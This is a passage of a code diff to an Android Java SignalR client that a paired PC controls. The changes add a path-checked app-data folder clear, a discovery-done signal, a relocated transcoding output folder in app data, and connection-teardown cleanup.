+                        java.io.File appRoot = (ctx != null && ctx.getApplicationInfo() != null)
+                                ? FileManager.getAppDataRoot(ctx) : null;
+                        if (targetFile != null && appRoot != null && targetFile.isDirectory()) {
+                            String canonicalTarget = targetFile.getCanonicalPath();
+                            String canonicalRoot = appRoot.getCanonicalPath();
+                            boolean inside = canonicalTarget.equals(canonicalRoot)
+                                    || canonicalTarget.startsWith(canonicalRoot + java.io.File.separator);
+                            if (inside && !canonicalTarget.equals(canonicalRoot)) {
+                                java.io.File[] kids = targetFile.listFiles();
+                                if (kids != null) {
+                                    for (java.io.File kid : kids) {
+                                        if (FileManager.deleteRecursive(kid)) removed++;
+                                    }
+                                }
+                                sendClassLog("SignalRClient", "Message", "[Clear] '" + relPath + "' removed " + removed + " entries, folder kept");
+                            } else {
+                                sendClassLog("SignalRClient", "Error", "[Clear] refused '" + relPath + "' (outside playground or root)");
+                            }
+                        }
+                    } catch (Exception e) {
+                        sendClassLog("SignalRClient", "Error", "[Clear] error: " + e.getMessage());
+                    }
+                    if (invocationId != null && !invocationId.isEmpty()) {
+                        JSONObject resp = new JSONObject();
+                        resp.put("removed", removed);
+                        sendCompletionResponse(out, invocationId, resp);
+                    }
                 } else if ("GetDeviceConfig".equals(target)) {
                     JSONObject cfg = new JSONObject();
                     cfg.put("videoFrameNormalized", MediaHelper.currentConfig.videoFrameNormalized);
@@ -812,11 +1202,50 @@ public class SignalRClient {
                     if (invocationId != null && !invocationId.isEmpty()) {
                         sendCompletionResponse(out, invocationId, arr);
                     }
+                } else if ("DiscoveryDone".equals(target)) {
+                    // PC's producer finished enumerating: discovery is truly
+                    // done for this run. Flip pools on next adjustPools if
+                    // proceed work is waiting (cleared by a new tree-walk,
+                    // config refresh, or disconnect).
+                    // DIAGNOSTIC (temporary): confirm receipt on the PC side.
+                    sendClassLog("SignalRClient", "Message", "DiscoveryDone RECEIVED from PC");
+                    serverDiscoveryDone = true;
+                    adjustPools();
                 } else if ("StartVideoTranscode".equals(target)) {
                     String relPath = args.optString(0, "");
-                    final String absPath = relPath.startsWith("/") ? relPath : FileManager.getRootStoragePath() + "/" + relPath;
-                    final String outRelPath = relPath + "_tr_" + System.currentTimeMillis() + ".mp4";
-                    final String outAbsPath = absPath + "_tr_" + System.currentTimeMillis() + ".mp4";
+                    // Resolve through the file layer so BOTH trees work: plain
+                    // storage paths AND the __appdata__ virtual root. (Naive
+                    // root concatenation here used to point App Data sources at
+                    // a nonexistent external path, wedging progress at 0%.)
+                    java.io.File resolvedSrc = FileManager.resolvePath(relPath);
+                    final String absPath = resolvedSrc != null ? resolvedSrc.getAbsolutePath()
+                            : (relPath.startsWith("/") ? relPath : FileManager.getRootStoragePath() + "/" + relPath);
+                    // Transcode DIRECTLY inside App Data (GameService/Transcoded Videos):
+                    // output never touches the source folder. Falls back to the legacy
+                    // same-folder behavior only if the private dir is unavailable.
+                    final String outRelPath;
+                    final String outAbsPath;
+                    {
+                        String baseName = new java.io.File(relPath).getName();
+                        int dot = baseName.lastIndexOf('.');
+                        String stem = dot > 0 ? baseName.substring(0, dot) : baseName;
+                        String fileName = stem + "_tr_" + System.currentTimeMillis() + ".mp4";
+                        java.io.File appTvDir = null;
+                        try {
+                            java.io.File appRoot = FileManager.getAppDataRoot(getAppContext());
+                            if (appRoot != null) {
+                                java.io.File cand = new java.io.File(appRoot, "Transcoded Videos");
+                                if (cand.exists() || cand.mkdirs()) appTvDir = cand;
+                            }
+                        } catch (Exception ignored) {}
+                        if (appTvDir != null) {
+                            outAbsPath = new java.io.File(appTvDir, fileName).getAbsolutePath();
+                            outRelPath = FileManager.APPDATA_PREFIX + "/Transcoded Videos/" + fileName;
+                        } else {
+                            outRelPath = relPath + "_tr_" + System.currentTimeMillis() + ".mp4";
+                            outAbsPath = absPath + "_tr_" + System.currentTimeMillis() + ".mp4";
+                        }
+                    }
                     float brm = (float) args.optDouble(1, 0.5);
                     float resm = (float) args.optDouble(2, 1.0);
                     Boolean bitrateCappingOverride = args.length() > 3 && !args.isNull(3) ? args.optBoolean(3) : null;
@@ -864,9 +1293,6 @@ public class SignalRClient {
                     sessions.put(sessionId, decoder);
                     decoder.start();
 
-                    // Add output to the FIFO room (evicts + deletes the oldest when full).
-                    trackTranscodedFile(outAbsPath);
-
                     JSONObject resp = new JSONObject();
                     resp.put("sessionId", sessionId);
                     resp.put("outputPath", outRelPath);
@@ -881,13 +1307,26 @@ public class SignalRClient {
         resp.put("progress", vd.getProgress());
         resp.put("outputBytes", vd.getOutputBytes());
 
-        // Convert absolute path back to relative path for API compatibility
+        // Convert absolute path back to relative path for API compatibility.
+        // External-storage outputs strip the storage root; App Data outputs
+        // (Transcoded Videos) map back to the __appdata__ virtual prefix.
         String absOut = vd.getOutputPath();
         String rootPath = FileManager.getRootStoragePath();
         String relOut = absOut;
         if (absOut != null && rootPath != null && absOut.startsWith(rootPath)) {
             relOut = absOut.substring(rootPath.length());
             if (relOut.startsWith("/")) relOut = relOut.substring(1);
+        } else {
+            try {
+                java.io.File appRoot = FileManager.getAppDataRoot(getAppContext());
+                if (appRoot != null && absOut != null) {
+                    String cRoot = appRoot.getCanonicalPath();
+                    String cOut = new java.io.File(absOut).getCanonicalPath();
+                    if (cOut.equals(cRoot) || cOut.startsWith(cRoot + java.io.File.separator)) {
+                        relOut = FileManager.APPDATA_PREFIX + cOut.substring(cRoot.length()).replace(java.io.File.separatorChar, '/');
+                    }
+                }
+            } catch (Exception ignored) {}
         }
 
         resp.put("outputPath", relOut);
@@ -1544,6 +1983,8 @@ public class SignalRClient {
         sendDebugLog("[Tunnel] PC connection dropped, cleaning up tunnels");
         isConnected = false;
         signalRWebSocketOut = null;
+        serverDiscoveryDone = false;
+        serverFlipHold = false;
         closeAllTunnels();
         p2pActive.set(false);
         closeP2P();
@@ -1551,10 +1992,12 @@ public class SignalRClient {
             pingScheduler.shutdownNow();
             pingScheduler = null;
         }
+        if (coreHeartbeat != null) {
+            coreHeartbeat.shutdownNow();
+            coreHeartbeat = null;
+        }
         if (activeSocket != null) {
             try { activeSocket.close(); } catch (Exception ignored) {}
             activeSocket = null;
         }
-        // Connection dropped or app stopped: wipe any transcoded files in the FIFO room.
-        cleanupTranscodedFiles();
     }}
